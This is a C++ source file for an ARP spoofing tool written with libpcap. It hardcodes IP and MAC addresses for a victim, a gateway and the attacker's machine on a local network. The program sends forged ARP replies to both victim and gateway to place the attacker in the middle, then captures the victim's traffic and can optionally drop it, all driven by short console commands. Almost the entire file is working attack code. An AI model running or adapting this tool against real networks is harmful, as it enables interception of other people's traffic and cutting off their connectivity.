#include "arp_spoofer_lib/headers/AdapterQuery.h"
#include "arp_spoofer_lib/headers/net_structure.h"
#include "arp_spoofer_lib/headers/ARPSpoofing.h"
#include "arp_spoofer_lib/headers/PacketHandler.h"

#include <iostream>
#include <ncurses.h>

using std::cin, std::cout, std::endl;

u_char target_ip[4] = IP_ARRAY(192, 168, 43, 171);
u_char target_mac[6] = MAC_ARRAY(9c, b6, d0, b9, 1a, 0f);

u_char gateway_ip[4] = IP_ARRAY(192, 168, 43, 1);
u_char gateway_mac[6] = MAC_ARRAY(22, 47, da, 58, 88, 8c);

u_char self_ip[4] = IP_ARRAY(192, 168, 43, 215);
u_char self_mac[6] = MAC_ARRAY(58, 91, CF, 98, 7B, FF);

u_char broadcast_ip[4] = IP_ARRAY(0, 0, 0, 0);
u_char broadcast_mac[6] = MAC_ARRAY(FF, FF, FF, FF, FF, FF);

int main() {
    cout << "sizeof(arp_packet): " << sizeof(arp_packet) << endl;
    string dev_name = list_dev_and_choose_dev();
    pcap_t *adapter = open_adapter(dev_name);

    char filter_buf[PCAP_ERRBUF_SIZE];
    bpf_program bpf;
    sprintf(filter_buf, "ether host %02x:%02x:%02x:%02x:%02x:%02x",
            EXPAND_MAC(target_mac));

#ifdef DEBUG
    printf("filter buf: %s\n", filter_buf);
#endif

    // compile bpf filter
//    if (pcap_compile(adapter, &bpf, filter_buf,
//                     1, PCAP_NETMASK_UNKNOWN) < 0) {
//        pcap_perror(adapter, "Error occurred when "
//                             "compiling BPF filter");
//        pcap_close(adapter);
//        return -1;
//    }
//
//    // set bpf filter on adapter
//    if (pcap_setfilter(adapter, &bpf) < 0) {
//        pcap_perror(adapter, "Error occurred when "
//                             "setting BPF filter");
//        pcap_close(adapter);
//        return -1;
//    }

    arp_packet *spoofing_target_packet = arp_packet_constructor(gateway_ip, self_mac,
                                                                target_ip, target_mac);
    ARP_packet_sender target_spoofer(adapter, spoofing_target_packet, 10);

    arp_packet *spoofing_gateway_packet = arp_packet_constructor(target_ip, self_mac,
                                                                 gateway_ip, gateway_mac);
    ARP_packet_sender gateway_spoofer(adapter, spoofing_gateway_packet, 1000);

    // TODO: Add ARP recovering

    PacketHandler pkt_h(adapter, self_mac,
                        target_mac, gateway_mac, target_ip);

    string cmd;
    while (cin >> cmd) {
        if (cmd == "so") {
            target_spoofer.start();
            gateway_spoofer.start();
        } else if (cmd == "sf") {
            target_spoofer.stop();
            gateway_spoofer.stop();
        } else if (cmd == "ex") {
            target_spoofer.stop();
            gateway_spoofer.stop();
            pkt_h.stop();
            pkt_h.stop();
            pcap_close(adapter);
            return 0;
        } else if (cmd == "po")
            pkt_h.start();
        else if (cmd == "pf")
            pkt_h.stop();
        else if (cmd == "do")
            pkt_h.set_drop_packet(true);
        else if (cmd == "df")
            pkt_h.set_drop_packet(false);
        else if (cmd[0] == 'r') {
            int rate_kBps = std::stoi(cmd.substr(1, std::string::npos));

        }
    }
    return 0;
}
